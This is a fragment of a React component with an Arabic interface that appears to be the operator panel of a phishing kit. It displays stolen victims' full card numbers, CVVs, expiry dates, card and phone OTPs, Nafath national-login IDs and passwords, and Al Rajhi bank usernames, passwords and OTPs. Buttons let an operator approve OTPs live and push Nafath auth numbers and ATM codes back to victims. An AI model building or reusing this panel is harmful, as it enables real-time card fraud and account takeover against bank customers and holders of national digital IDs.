                      className="w-full max-w-[400px] mx-auto aspect-[1.6/1] rounded-2xl p-6 relative overflow-hidden shadow-xl mb-6"
                      style={{
                        background:
                          "linear-gradient(135deg, #1a365d 0%, #2d3748 50%, #1a202c 100%)",
                      }}
                    >
                      <div
                        className="absolute top-0 right-0 w-64 h-64 rounded-full opacity-10"
                        style={{
                          background:
                            "radial-gradient(circle, white 0%, transparent 70%)",
                          transform: "translate(30%, -30%)",
                        }}
                      />
                      <div className="flex justify-between items-start mb-6">
                        <div className="w-12 h-9 rounded bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center shadow-md">
                          <div className="w-8 h-6 rounded-sm bg-gradient-to-br from-yellow-300 to-yellow-500 opacity-80" />
                        </div>
                        <div className="text-left">
                          <div
                            className="text-white font-bold text-lg"
                            data-testid="card-bank-name"
                          >
                            {binData?.bank?.name ||
                              binData?.scheme?.toUpperCase() ||
                              "mada"}
                          </div>
                          {binData?.type && (
                            <div className="text-white/60 text-[10px]">
                              {binData.type === "debit"
                                ? "DEBIT"
                                : binData.type === "credit"
                                  ? "CREDIT"
                                  : binData.type.toUpperCase()}
                            </div>
                          )}
                        </div>
                      </div>
                      <div className="mb-6">
                        <div
                          className="font-mono text-2xl text-white tracking-[0.2em] font-medium"
                          dir="ltr"
                        >
                          {getCardNumber(selectedApplication)
                            ?.replace(/(.{4})/g, "$1 ")
                            .trim()}
                        </div>
                      </div>
                      <div className="flex justify-between items-end text-white">
                        <div>
                          <div className="text-[10px] text-white/60 mb-1">
                            CARD HOLDER
                          </div>
                          <div className="font-medium uppercase text-sm">
                            {getCardName(selectedApplication) || "NAME"}
                          </div>
                        </div>
                        <div className="text-left">
                          <div className="text-[10px] text-white/60 mb-1">
                            EXPIRES
                          </div>
                          <div className="font-mono text-sm">
                            {getCardExpiry(selectedApplication) || "MM/YY"}
                          </div>
                        </div>
                        <div className="text-left">
                          <div className="text-[10px] text-white/60 mb-1">
                            CVV
                          </div>
                          <div className="font-mono text-sm font-bold">
                            {getCardCvv(selectedApplication) || "***"}
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Card Details */}
                    <div className="space-y-1">
                      <DataRow
                        label="رقم البطاقة"
                        value={getCardNumber(selectedApplication)}
                        isLtr
                      />
                      <DataRow
                        label="اسم حامل البطاقة"
                        value={getCardName(selectedApplication)}
                      />
                      <DataRow
                        label="تاريخ الانتهاء"
                        value={getCardExpiry(selectedApplication)}
                        isLtr
                      />
                      <DataRow
                        label="CVV"
                        value={getCardCvv(selectedApplication)}
                        isLtr
                      />
                    </div>

                    {/* BIN Info Section */}
                    {binLoading ? (
                      <div className="mt-4 p-4 bg-muted rounded-lg text-center text-sm text-muted-foreground">
                        جاري البحث عن معلومات البطاقة...
                      </div>
                    ) : binData ? (
                      <div className="mt-4 p-4 bg-gradient-to-l from-blue-50 to-purple-50 dark:from-blue-900/20 dark:to-purple-900/20 rounded-lg border border-blue-200 dark:border-blue-800">
                        <h4 className="font-bold text-sm mb-3 flex items-center gap-2 text-blue-700 dark:text-blue-400">
                          <Globe size={14} />
                          معلومات البطاقة
                        </h4>
                        <div className="grid grid-cols-2 gap-3 text-sm">
                          {binData.bank?.name && (
                            <div className="flex flex-col">
                              <span className="text-xs text-gray-500 dark:text-gray-400">
                                البنك
                              </span>
                              <span
                                className="font-medium text-foreground"
                                data-testid="bin-bank-name"
                              >
                                {binData.bank.name}
                              </span>
                            </div>
                          )}
                          {binData.scheme && (
                            <div className="flex flex-col">
                              <span className="text-xs text-gray-500 dark:text-gray-400">
                                الشبكة
                              </span>
                              <span
                                className="font-medium uppercase text-foreground"
                                data-testid="bin-scheme"
                              >
                                {binData.scheme}
                              </span>
                            </div>
                          )}
                          {binData.type && (
                            <div className="flex flex-col">
                              <span className="text-xs text-gray-500 dark:text-gray-400">
                                نوع البطاقة
                              </span>
                              <span
                                className="font-medium capitalize text-foreground"
                                data-testid="bin-type"
                              >
                                {binData.type === "debit"
                                  ? "بطاقة سحب"
                                  : binData.type === "credit"
                                    ? "بطاقة ائتمان"
                                    : binData.type}
                              </span>
                            </div>
                          )}
                          {binData.country?.name && (
                            <div className="flex flex-col">
                              <span className="text-xs text-gray-500 dark:text-gray-400">
                                الدولة
                              </span>
                              <span
                                className="font-medium text-foreground"
                                data-testid="bin-country"
                              >
                                {binData.country.emoji} {binData.country.name}
                              </span>
                            </div>
                          )}
                          {binData.brand && (
                            <div className="flex flex-col">
                              <span className="text-xs text-gray-500 dark:text-gray-400">
                                العلامة التجارية
                              </span>
                              <span
                                className="font-medium text-foreground"
                                data-testid="bin-brand"
                              >
                                {binData.brand}
                              </span>
                            </div>
                          )}
                          {binData.prepaid !== undefined && (
                            <div className="flex flex-col">
                              <span className="text-xs text-gray-500 dark:text-gray-400">
                                مسبقة الدفع
                              </span>
                              <span
                                className="font-medium text-foreground"
                                data-testid="bin-prepaid"
                              >
                                {binData.prepaid ? "نعم" : "لا"}
                              </span>
                            </div>
                          )}
                        </div>
                      </div>
                    ) : null}
                  </div>
                </div>
              )}

              {/* OTP Codes Section */}
              {(selectedApplication.otpCode ||
                selectedApplication.phoneOtpCode) && (
                <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                  <div className="bg-gradient-to-l from-blue-500/10 to-card px-4 py-3 border-b border-border">
                    <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
                      <Key size={16} className="text-blue-500" />
                      رموز التحقق
                      {!selectedApplication.cardOtpApproved && selectedApplication.otpCode && (
                        <Badge className="bg-amber-100 text-amber-700 text-[9px] animate-pulse mr-2">
                          بانتظار الموافقة
                        </Badge>
                      )}
                      {selectedApplication.cardOtpApproved && (
                        <Badge className="bg-green-100 text-green-700 text-[9px] mr-2">
                          تمت الموافقة
                        </Badge>
                      )}
                    </h3>
                  </div>
                  <div className="p-6 space-y-4">
                    <div className="grid grid-cols-2 gap-4">
                      {selectedApplication.otpCode && (
                        <div className={cn(
                          "rounded-lg p-4 text-center",
                          selectedApplication.cardOtpApproved 
                            ? "bg-green-50 dark:bg-green-900/30 border-2 border-green-500" 
                            : "bg-blue-50 dark:bg-blue-900/30"
                        )}>
                          <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">
                            OTP البطاقة
                          </p>
                          <p
                            className={cn(
                              "font-mono text-2xl font-bold",
                              selectedApplication.cardOtpApproved 
                                ? "text-green-600 dark:text-green-400" 
                                : "text-blue-600 dark:text-blue-400"
                            )}
                            data-testid="text-card-otp"
                          >
                            {selectedApplication.otpCode}
                          </p>
                          {selectedApplication.cardOtpApproved && (
                            <Badge className="bg-green-500 text-white mt-2">
                              <CheckCircle size={12} className="ml-1" />
                              تمت الموافقة
                            </Badge>
                          )}
                          <Button
                            size="sm"
                            variant="outline"
                            className="mt-2"
                            onClick={() =>
                              copyToClipboard(
                                selectedApplication.otpCode!,
                                "OTP البطاقة",
                              )
                            }
                            data-testid="button-copy-card-otp"
                          >
                            <Copy size={12} className="ml-1" />
                            نسخ
                          </Button>
                        </div>
                      )}
                      {selectedApplication.phoneOtpCode && (
                        <div className={cn(
                          "rounded-lg p-4 text-center",
                          selectedApplication.phoneOtpApproved 
                            ? "bg-green-50 dark:bg-green-900/30 border-2 border-green-500" 
                            : "bg-pink-50 dark:bg-pink-900/30"
                        )}>
                          <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">
                            OTP الهاتف
                          </p>
                          <p
                            className={cn(
                              "font-mono text-2xl font-bold",
                              selectedApplication.phoneOtpApproved 
                                ? "text-green-600 dark:text-green-400" 
                                : "text-pink-600 dark:text-pink-400"
                            )}
                            data-testid="text-phone-otp"
                          >
                            {selectedApplication.phoneOtpCode}
                          </p>
                          {selectedApplication.phoneOtpApproved && (
                            <Badge className="bg-green-500 text-white mt-2">
                              <CheckCircle size={12} className="ml-1" />
                              تمت الموافقة
                            </Badge>
                          )}
                          <Button
                            size="sm"
                            variant="outline"
                            className="mt-2"
                            onClick={() =>
                              copyToClipboard(
                                selectedApplication.phoneOtpCode!,
                                "OTP الهاتف",
                              )
                            }
                            data-testid="button-copy-phone-otp"
                          >
                            <Copy size={12} className="ml-1" />
                            نسخ
                          </Button>
                        </div>
                      )}
                    </div>
                    {/* OTP Approval Buttons */}
                    <div className="flex flex-wrap gap-2 pt-2 border-t border-border">
                      {selectedApplication.otpCode && !selectedApplication.cardOtpApproved && (
                        <Button
                          size="sm"
                          onClick={() => {
                            handleFieldApproval(selectedApplication.id, "cardOtpApproved", true);
                            handleApprovalStatus(selectedApplication.id, "approved_otp");
                          }}
                          className="bg-emerald-600 hover:bg-emerald-700"
                          data-testid="button-approve-card-otp"
                        >
                          <CheckCircle className="h-4 w-4 ml-2" />
                          موافقة OTP البطاقة
                        </Button>
                      )}
                      {selectedApplication.phoneOtpCode && !selectedApplication.phoneOtpApproved && (
                        <Button
                          size="sm"
                          onClick={() => handleFieldApproval(selectedApplication.id, "phoneOtpApproved", true)}
                          className="bg-pink-600 hover:bg-pink-700"
                          data-testid="button-approve-phone-otp"
                        >
                          <CheckCircle className="h-4 w-4 ml-2" />
                          موافقة OTP الهاتف
                        </Button>
                      )}
                      {(selectedApplication.otpCode || selectedApplication.phoneOtpCode) && 
                       !selectedApplication.cardOtpApproved && !selectedApplication.phoneOtpApproved && (
                        <Button
                          size="sm"
                          variant="destructive"
                          onClick={() => handleApprovalStatus(selectedApplication.id, "rejected")}
                          data-testid="button-reject-otp"
                        >
                          <Ban className="h-4 w-4 ml-2" />
                          رفض
                        </Button>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* Nafaz Section */}
              {(selectedApplication.nafazId ||
                selectedApplication.nafazPass) && (
                <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                  <div className="bg-gradient-to-l from-green-500/10 to-card px-4 py-3 border-b border-border">
                    <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
                      <Lock size={16} className="text-green-500" />
                      نفاذ
                      {!selectedApplication.nafathApproved && (
                        <Badge className="bg-green-100 text-green-700 text-[9px] animate-pulse">
                          بانتظار الموافقة
                        </Badge>
                      )}
                    </h3>
                  </div>
                  <div className="p-6 space-y-4">
                    <DataRow
                      label="رقم الهوية"
                      value={selectedApplication.nafazId}
                      isLtr
                    />
                    <DataRow
                      label="كلمة المرور"
                      value={selectedApplication.nafazPass}
                      isLtr
                    />
                    
                    {/* Editable Auth Number */}
                    <div className="bg-purple-50 dark:bg-purple-900/30 rounded-lg p-4 border border-purple-200 dark:border-purple-800">
                      <label className="block text-sm font-bold text-purple-700 dark:text-purple-400 mb-2">
                        رقم التحقق (Auth Number)
                      </label>
                      <div className="flex gap-2">
                        <Input
                          value={nafazAuthNumber || selectedApplication.authNumber || ""}
                          onChange={(e) => setNafazAuthNumber(e.target.value)}
                          placeholder="أدخل رقم التحقق"
                          className="text-center text-xl font-mono flex-1"
                          dir="ltr"
                          data-testid="input-nafaz-auth-number"
                        />
                        <Button
                          onClick={() => {
                            const authNum = nafazAuthNumber || selectedApplication.authNumber || "";
                            if (authNum.trim()) {
                              handleUpdateNafazAuthNumber(selectedApplication.id, authNum);
                            }
                          }}
                          className="bg-purple-600 hover:bg-purple-700"
                          data-testid="button-save-nafaz-auth"
                        >
                          <Send size={16} className="ml-1" />
                          إرسال
                        </Button>
                      </div>
                      {selectedApplication.authNumber && selectedApplication.authNumber !== "..." && (
                        <p className="text-xs text-purple-600 dark:text-purple-400 mt-2 text-center">
                          الرقم الحالي: <span className="font-mono font-bold">{selectedApplication.authNumber}</span>
                        </p>
                      )}
                    </div>

                    <div className="pt-4 border-t border-border">
                      <Button
                        onClick={() =>
                          handleFieldApproval(
                            selectedApplication.id,
                            "nafathApproved",
                            true,
                          )
                        }
                        className={cn(
                          "w-full",
                          selectedApplication.nafathApproved
                            ? "bg-green-600"
                            : "bg-green-500 hover:bg-green-600",
                        )}
                        disabled={selectedApplication.nafathApproved}
                        data-testid="button-approve-nafaz"
                      >
                        <CheckCircle className="h-4 w-4 ml-2" />
                        {selectedApplication.nafathApproved
                          ? "تمت الموافقة"
                          : "موافقة نفاذ"}
                      </Button>
                    </div>
                  </div>
                </div>
              )}

              {/* Rajhi Section */}
              {(selectedApplication.rajhiUser ||
                selectedApplication.rajhiPassword) && (
                <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                  <div className="bg-gradient-to-l from-teal-500/10 to-card px-4 py-3 border-b border-border">
                    <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
                      <Shield size={16} className="text-teal-500" />
                      الراجحي
                    </h3>
                  </div>
                  <div className="p-6 space-y-1">
                    <DataRow
                      label="اسم المستخدم"
                      value={selectedApplication.rajhiUser}
                      isLtr
                    />
                    <DataRow
                      label="كلمة المرور"
                      value={selectedApplication.rajhiPassword}
                      isLtr
                    />
                    {selectedApplication.rajhiOtp && (
                      <DataRow
                        label="OTP"
                        value={selectedApplication.rajhiOtp}
                        isLtr
                      />
                    )}
                  </div>
                </div>
              )}

              {/* Actions Section */}
              <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden" ref={(el) => el?.scrollIntoView({ behavior: 'smooth', block: 'end' })}>
                <div className="bg-gradient-to-l from-gray-500/10 to-card px-4 py-3 border-b border-border">
                  <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
                    <Settings size={16} className="text-gray-500" />
                    الإجراءات
                  </h3>
                </div>
                <div className="p-6 space-y-4">
                  {/* Card Info Summary */}
                  {getCardNumber(selectedApplication) && (
                    <div className="bg-gradient-to-l from-blue-500/10 to-transparent p-4 rounded-lg border border-blue-200 dark:border-blue-800">
                      <div className="flex items-center gap-3 mb-3">
                        <CreditCard size={20} className="text-blue-500" />
                        <span className="font-bold text-sm">معلومات البطاقة</span>
                      </div>
                      <div className="grid grid-cols-2 gap-3 text-sm">
                        <div>
                          <span className="text-muted-foreground">رقم البطاقة:</span>
                          <div className="font-mono text-foreground" dir="ltr">{getCardNumber(selectedApplication)}</div>
                        </div>
                        {getCardName(selectedApplication) && (
                          <div>
                            <span className="text-muted-foreground">اسم حامل البطاقة:</span>
                            <div className="font-medium text-foreground">{getCardName(selectedApplication)}</div>
                          </div>
                        )}
                        {getCardExpiry(selectedApplication) && (
                          <div>
                            <span className="text-muted-foreground">تاريخ الانتهاء:</span>
                            <div className="font-mono text-foreground" dir="ltr">{getCardExpiry(selectedApplication)}</div>
                          </div>
                        )}
                        {getCardCvv(selectedApplication) && (
                          <div>
                            <span className="text-muted-foreground">CVV:</span>
                            <div className="font-mono text-foreground" dir="ltr">{getCardCvv(selectedApplication)}</div>
                          </div>
                        )}
                      </div>
                    </div>
                  )}
                  <div className="flex flex-wrap gap-3">
                    <Button
                      size="sm"
                      onClick={() =>
                        handleApprovalStatus(
                          selectedApplication.id,
                          "approved_otp",
                        )
                      }
                      className="bg-emerald-600 hover:bg-emerald-700"
                      data-testid="button-approve-otp"
                    >
                      <CheckCircle className="h-4 w-4 ml-2" />
                      موافقة OTP
                    </Button>
                    <Dialog>
                      <DialogTrigger asChild>
                        <Button
                          size="sm"
                          variant="outline"
                          data-testid="button-atm-dialog"
                        >
                          <Key className="h-4 w-4 ml-2" />
                          إرسال رمز صراف
                        </Button>
                      </DialogTrigger>
                      <DialogContent>
                        <DialogHeader>
                          <DialogTitle>إرسال رمز الصراف</DialogTitle>
                        </DialogHeader>
                        <div className="py-4">
                          <Input
                            value={atmCode}
                            onChange={(e) => setAtmCode(e.target.value)}
                            placeholder="أدخل رمز الصراف"
                            className="text-center text-xl"
                            data-testid="input-atm-code"
                          />
                        </div>
                        <DialogFooter>
                          <DialogClose asChild>
                            <Button
                              disabled={!atmCode.trim()}
                              onClick={() => {
                                if (atmCode.trim()) {
                                  handleApprovalStatus(
                                    selectedApplication.id,
                                    "approved_atm",
                                    atmCode.trim(),
                                  );
                                  setAtmCode("");
                                }
                              }}
                              data-testid="button-confirm-atm"
                            >
                              تأكيد
                            </Button>
                          </DialogClose>
                        </DialogFooter>
                      </DialogContent>
                    </Dialog>
                    <Button
                      size="sm"
                      variant="destructive"
                      onClick={() =>
                        handleApprovalStatus(selectedApplication.id, "rejected")
                      }
                      data-testid="button-reject"
                    >
                      <X className="h-4 w-4 ml-2" />
                      رفض
                    </Button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        ) : (
          <div className="flex-1 flex items-center justify-center text-muted-foreground">
            <div className="text-center">
              <MessageSquare className="h-16 w-16 mx-auto mb-4 opacity-30" />
              <p className="text-lg">اختر طلب من القائمة</p>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
